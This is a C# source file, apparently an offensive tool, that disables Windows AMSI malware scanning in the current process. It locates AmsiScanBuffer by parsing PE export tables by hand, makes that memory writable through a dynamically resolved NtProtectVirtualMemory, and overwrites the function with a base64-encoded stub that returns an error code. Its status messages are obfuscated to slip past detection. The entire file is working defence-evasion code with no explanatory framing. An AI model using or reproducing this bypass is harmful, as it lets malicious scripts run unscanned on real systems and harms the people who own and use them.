using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

public class Runner
{
    public static void Main()
    {
        Patch();
    }
    public static IntPtr GetLoadedModuleAddress(string DLLName)
    {
        ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
        foreach (ProcessModule Mod in ProcModules)
        {
            if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
            {
                //Console.WriteLine(Mod.FileName);
                return Mod.BaseAddress;
            }
        }
        return IntPtr.Zero;
    }

    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
    {
        IntPtr FunctionPtr = IntPtr.Zero;
        try
        {
            // Traverse the PE header in memory
            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
            Int64 pExport = 0;
            if (Magic == 0x010b)
            {
                pExport = OptHeader + 0x60;
            }
            else
            {
                pExport = OptHeader + 0x70;
            }

            // Read -> IMAGE_EXPORT_DIRECTORY
            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

            // Loop the array of export name RVA's
            for (int i = 0; i < NumberOfNames; i++)
            {
                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                {
                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                    //Console.WriteLine(FunctionName);
                    break;
                }
            }
        }
        catch
        {
            // Catch parser failure
            throw new InvalidOperationException("Failed to parse module exports.");
        }

        if (FunctionPtr == IntPtr.Zero)
        {
            // Export not found
            throw new MissingMethodException(ExportName + ", export not found.");
        }
        return FunctionPtr;
    }


    public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
    {
        IntPtr hModule = GetLoadedModuleAddress(DLLName);
        if (hModule == IntPtr.Zero)
        {
            throw new DllNotFoundException(DLLName + ", Dll was not found.");
        }

        return GetExportAddress(hModule, FunctionName);
    }

    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
    {
        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
    }
    public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
    {
        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
        return funcDelegate.DynamicInvoke(Parameters);
    }
    private static bool is64Bit()
    {
        if (IntPtr.Size == 4)
            return false;

        return true;
    }



    private static byte[] getPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("uFcAB4DCGAA=");//mov    eax,0x80070057 | ret 0x18
        return Convert.FromBase64String("uFcAB4DD");
    }

    private static IntPtr getAMSILocation()
    {
        
        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", "LoadLibraryA");
        LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));

        return CustomGetProcAddress(fLoadLibrary("amsi.dll"), "AmsiScanBuffer");
    }

    private static uint SetMemProtect(IntPtr targetBaseAddrr, uint MemoryProtection)
    {

        IntPtr pNtProtectVirtualMemory = GetLibraryAddress("ntdll.dll", "NtProtectVirtualMemory");
        NtProtectVirtualMemoryD fNtProtectVirtualMemory = (NtProtectVirtualMemoryD)Marshal.GetDelegateForFunctionPointer(pNtProtectVirtualMemory, typeof(NtProtectVirtualMemoryD));

        // Current process handle
        IntPtr hProcess = Process.GetCurrentProcess().Handle;
        IntPtr regionSize = (IntPtr)getPayload().Length;

        uint oldProtection = 0;
        if (fNtProtectVirtualMemory(hProcess, ref targetBaseAddrr, ref regionSize, MemoryProtection, ref oldProtection) == 0)
        {
               return oldProtection;
        }
        else
        {
            return 0;
        }

    }
    public static void Patch()
    {
        IntPtr amsiBaseAddr = getAMSILocation();
        if (amsiBaseAddr != (IntPtr)0)
        {
            uint oldProtection = SetMemProtect(amsiBaseAddr, 0x4);
            Marshal.Copy(getPayload(), 0, amsiBaseAddr, getPayload().Length);
            Console.WriteLine("[+] Successfully patched AM...SI!");
            SetMemProtect(amsiBaseAddr, oldProtection);
        }
        else
        {
            Console.WriteLine("[!] Patching AM...SI FAILED");
        }

    }


    static IntPtr CustomGetProcAddress(IntPtr pDosHdr, String func_name)
    {
        // One offset changes between 32 and 64-bit processes
        int exportrva_offset = 136;
        if (IntPtr.Size == 4)
        {
            exportrva_offset = 120;
        }

        // Current process handle
        IntPtr hProcess = Process.GetCurrentProcess().Handle;

        // DOS header(IMAGE_DOS_HEADER)->e_lfanew
        IntPtr e_lfanew_addr = pDosHdr + (int)0x3C;
        byte[] e_lfanew_bytearr = new byte[4];
        NtReadVirtualMemory(hProcess, e_lfanew_addr, e_lfanew_bytearr, e_lfanew_bytearr.Length, out _);
        ulong e_lfanew_value = BitConverter.ToUInt32(e_lfanew_bytearr, 0);
        //Console.WriteLine("[*] e_lfanew: \t\t\t\t\t0x" + (e_lfanew_value).ToString("X"));

        // NT Header (IMAGE_NT_HEADERS)->FileHeader(IMAGE_FILE_HEADER)->SizeOfOptionalHeader
        IntPtr sizeopthdr_addr = pDosHdr + (int)e_lfanew_value + 20;
        byte[] sizeopthdr_bytearr = new byte[2];
        NtReadVirtualMemory(hProcess, sizeopthdr_addr, sizeopthdr_bytearr, sizeopthdr_bytearr.Length, out _);
        ulong sizeopthdr_value = BitConverter.ToUInt16(sizeopthdr_bytearr, 0);
        //Console.WriteLine("[*] SizeOfOptionalHeader: \t\t\t0x" + (sizeopthdr_value).ToString("X"));
        int numberDataDirectory = ((int)sizeopthdr_value / 16) - 1;

        // exportTableRVA: Optional Header(IMAGE_OPTIONAL_HEADER64)->DataDirectory(IMAGE_DATA_DIRECTORY)[0]->VirtualAddress
        IntPtr exportTableRVA_addr = pDosHdr + (int)e_lfanew_value + exportrva_offset;
        byte[] exportTableRVA_bytearr = new byte[4];
        NtReadVirtualMemory(hProcess, exportTableRVA_addr, exportTableRVA_bytearr, exportTableRVA_bytearr.Length, out _);
        ulong exportTableRVA_value = BitConverter.ToUInt32(exportTableRVA_bytearr, 0);
        //Console.WriteLine("[*] exportTableRVA address: \t\t\t0x" + (exportTableRVA_addr).ToString("X"));

        if (exportTableRVA_value != 0)
        {
            // NumberOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->NumberOfNames
            IntPtr numberOfNames_addr = pDosHdr + (int)exportTableRVA_value + 0x18;
            byte[] numberOfNames_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, numberOfNames_addr, numberOfNames_bytearr, numberOfNames_bytearr.Length, out _);
            int numberOfNames_value = (int)BitConverter.ToUInt32(numberOfNames_bytearr, 0);
            //Console.WriteLine("[*] numberOfNames: \t\t\t\t0x" + (numberOfNames_value).ToString("X"));

            // AddressOfFunctions: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfFunctions
            IntPtr addressOfFunctionsVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x1C;
            byte[] addressOfFunctionsVRA_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, addressOfFunctionsVRA_addr, addressOfFunctionsVRA_bytearr, addressOfFunctionsVRA_bytearr.Length, out _);
            ulong addressOfFunctionsVRA_value = BitConverter.ToUInt32(addressOfFunctionsVRA_bytearr, 0);
            //Console.WriteLine("[*] addressOfFunctionsVRA: \t\t\t0x" + (addressOfFunctionsVRA_value).ToString("X"));

            // AddressOfNames: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNames
            IntPtr addressOfNamesVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x20;
            byte[] addressOfNamesVRA_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, addressOfNamesVRA_addr, addressOfNamesVRA_bytearr, addressOfNamesVRA_bytearr.Length, out _);
            ulong addressOfNamesVRA_value = BitConverter.ToUInt32(addressOfNamesVRA_bytearr, 0);
            //Console.WriteLine("[*] addressOfNamesVRA: \t\t\t\t0x" + (addressOfNamesVRA_value).ToString("X"));

            // AddressOfNameOrdinals: ExportTable(IMAGE_EXPORT_DIRECTORY)->AddressOfNameOrdinals
            IntPtr addressOfNameOrdinalsVRA_addr = pDosHdr + (int)exportTableRVA_value + 0x24;
            byte[] addressOfNameOrdinalsVRA_bytearr = new byte[4];
            NtReadVirtualMemory(hProcess, addressOfNameOrdinalsVRA_addr, addressOfNameOrdinalsVRA_bytearr, addressOfNameOrdinalsVRA_bytearr.Length, out _);
            ulong addressOfNameOrdinalsVRA_value = BitConverter.ToUInt32(addressOfNameOrdinalsVRA_bytearr, 0);
            //Console.WriteLine("[*] addressOfNameOrdinalsVRA: \t\t\t0x" + (addressOfNameOrdinalsVRA_value).ToString("X"));

            IntPtr addressOfFunctionsRA = IntPtr.Add(pDosHdr, (int)addressOfFunctionsVRA_value);
            IntPtr addressOfNamesRA = IntPtr.Add(pDosHdr, (int)addressOfNamesVRA_value);
            IntPtr addressOfNameOrdinalsRA = IntPtr.Add(pDosHdr, (int)addressOfNameOrdinalsVRA_value);

            IntPtr auxaddressOfNamesRA = addressOfNamesRA;
            IntPtr auxaddressOfNameOrdinalsRA = addressOfNameOrdinalsRA;
            IntPtr auxaddressOfFunctionsRA = addressOfFunctionsRA;

            for (int i = 0; i < numberOfNames_value; i++)
            {
                byte[] data5 = new byte[Marshal.SizeOf(typeof(UInt32))];
                NtReadVirtualMemory(hProcess, auxaddressOfNamesRA, data5, data5.Length, out _);
                UInt32 functionAddressVRA = (UInt32)BitConverter.ToUInt32(data5, 0);
                IntPtr functionAddressRA = IntPtr.Add(pDosHdr, (int)functionAddressVRA);
                byte[] data6 = new byte[func_name.Length];
                NtReadVirtualMemory(hProcess, functionAddressRA, data6, data6.Length, out _);
                String functionName = Encoding.ASCII.GetString(data6);
                if (functionName == func_name)
                {
                    // AdddressofNames --> AddressOfNamesOrdinals
                    byte[] data7 = new byte[Marshal.SizeOf(typeof(UInt16))];
                    NtReadVirtualMemory(hProcess, auxaddressOfNameOrdinalsRA, data7, data7.Length, out _);
                    UInt16 ordinal = (UInt16)BitConverter.ToUInt16(data7, 0);
                    // AddressOfNamesOrdinals --> AddressOfFunctions
                    auxaddressOfFunctionsRA += 4 * ordinal;
                    byte[] data8 = new byte[Marshal.SizeOf(typeof(UInt32))];
                    NtReadVirtualMemory(hProcess, auxaddressOfFunctionsRA, data8, data8.Length, out _);
                    UInt32 auxaddressOfFunctionsRAVal = (UInt32)BitConverter.ToUInt32(data8, 0);
                    IntPtr functionAddress = IntPtr.Add(pDosHdr, (int)auxaddressOfFunctionsRAVal);
                    return functionAddress;
                }
                auxaddressOfNamesRA += 4;
                auxaddressOfNameOrdinalsRA += 2;
            }
        }
        return IntPtr.Zero;
    }



    private static object[] globalArgs = null;

    #region dynamic definitions

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern bool NtReadVirtualMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate UInt32 NtProtectVirtualMemoryD(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr LoadLibrary(string GradeSharp);


    #endregion
    public static uint DLL_PROCESS_ATTACH = 1;

}